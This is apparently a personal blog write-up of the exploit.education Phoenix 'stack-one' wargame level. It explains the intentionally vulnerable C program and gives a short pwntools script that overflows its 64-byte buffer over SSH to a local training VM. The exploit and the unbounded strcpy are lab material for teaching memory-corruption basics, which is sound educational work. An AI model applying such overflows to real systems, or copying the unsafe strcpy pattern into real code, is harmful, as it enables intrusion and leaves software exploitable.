## Stack-one

![](https://Cyberguru1.github.io/posts/phoenix/files/st1_header.png)


### Source Code
---

```
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}

```

Let's digging the code:
---

- The main() function is the entry point of the program.

- Inside the main() function, there is a definition of a structure named locals. It contains two members: buffer, an array of characters with a size of 64, and changeme, a volatile integer.

- The printf() function is used to print the program's welcome message.

- The program checks if the number of command-line arguments (argc) is less than 2. If true, it calls errx() to display an error message and terminate the program.

- The changeme variable is initialized to 0.

- The strcpy() function copies the content of argv[1] (the second command-line argument) into locals.buffer. This is potentially unsafe since strcpy() does not perform bounds checking.

- After the strcpy() call, the program checks if changeme is equal to 0x496c5962. If true, it outputs a success message.

- If changeme is not equal to 0x496c5962, it displays a message showing the current value of changeme and the expected value.

- Finally, the program exits with a status code of 0.

This challenge is similar to Stack one, but the main goal here is to not only change the variable of the `changeme` to the overflow value but to a specific value that is `0x496c5962`, so we use the pwntools module to write a script that could accomplish that

```

#!/usr/bin/python
## script by Hamza Saidu 
## Cyberguru
## enjoy!!!

from pwn import *


s = ssh(host='localhost', user='user', password='user', port=2222)

# crafting payload
payload = b"A" * 64

# adding the comparision variable
payload += p32(0x496c5962)

p = s.run(f'/opt/phoenix/amd64/stack-one {payload.decode()}')

# p.sendline(payload)

print(p.recvall().decode())

```

Explanation of the code:
---

```
from pwn import *
```
- The pwn library is imported, which provides functions for binary exploitation and interaction with remote services.

```
s = ssh(host='localhost', user='user', password='user', port=2222)
```
- An SSH connection is established to a server running on localhost with the username "user," password "user," and port 2222.

```
# crafting payload
payload = b"A" * 64
```
- The payload is crafted as a byte string consisting of 64 'A' characters.

```
# adding the comparision variable
payload += p32(0x496c5962)
```
- The comparison variable (0x496c5962) is appended to the payload using p32() to pack it into a little-endian 32-bit format.

```
p = s.run(f'/opt/phoenix/amd64/stack-one {payload.decode()}')
```
- The script runs the command /opt/phoenix/amd64/stack-one on the remote server, passing the crafted payload as a command-line argument. The decode() function is used to convert the payload from bytes to a string.

```
print(p.recvall().decode())
```
- The script receives and prints the output of the command executed on the remote server.

And finally running the script we have:

![](https://Cyberguru1.github.io/posts/phoenix/files/st1_result.png)

